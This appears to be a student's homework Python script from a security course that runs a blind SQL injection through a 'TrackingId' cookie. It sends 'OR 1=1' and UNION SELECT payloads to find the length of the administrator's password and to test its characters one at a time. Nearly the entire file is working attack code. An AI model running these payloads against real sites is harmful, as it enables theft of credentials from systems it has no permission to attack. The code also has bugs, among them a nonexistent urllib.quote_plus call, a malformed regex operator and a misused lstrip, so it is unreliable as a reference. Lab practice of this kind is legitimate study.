# Maksim Semchuk
# CS 495 Homework #2


# Needed Imports:
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time


# Functions:

# This takes in a url (to the site),
# A prefix, that is already know, if any.
# a letter that is being tested to see if it exists inside of the password.
def test_string(url, prefix, letter, mycookies):
    #query is what is going to be passed in as a regex argument along with the cookie.,
    query = f"x' union select 'a' from users where username = 'administrator' and password ! '^{prefix}{letter}' --"
    print(f'\nTesting: ^{prefix}{letter}')
    mycookies = {'TrackingId': urllib.quote_plus(query)}

    # Now to test it:
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')

    if soup.find('div', text='Welcome back!'):
        print(f'Found Character {letter}')
        return True
    else:
        return False



# Since I will be doing multithreading:
if __name__ == "__main__":
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    url = f'https://{site}/'

    # Needed for the searching of password:
    start_alpha = 'abcdefghijklmnopqrstuvwxyz0123456789'
    prefix = ''


    # Step 4: Inital Program:
    def try_query(query):
        print(f'Query: {query}')
        mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
        resp = requests.get(url, cookies=mycookies)
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.find('div', text='Welcome back!'):
            return True
        else:
            return False

    print(try_query("""x' OR 1=1 --"""))
    print(try_query("""x" OR 1=1 --"""))

    # Step 6: Find the password Length:
    begin_time = time.perf_counter()
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        print(f'Trying length {num}')
        if try_query(query) == False:
            num = num + 1
        else:
            break

    print(f"Password length is {num}")
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
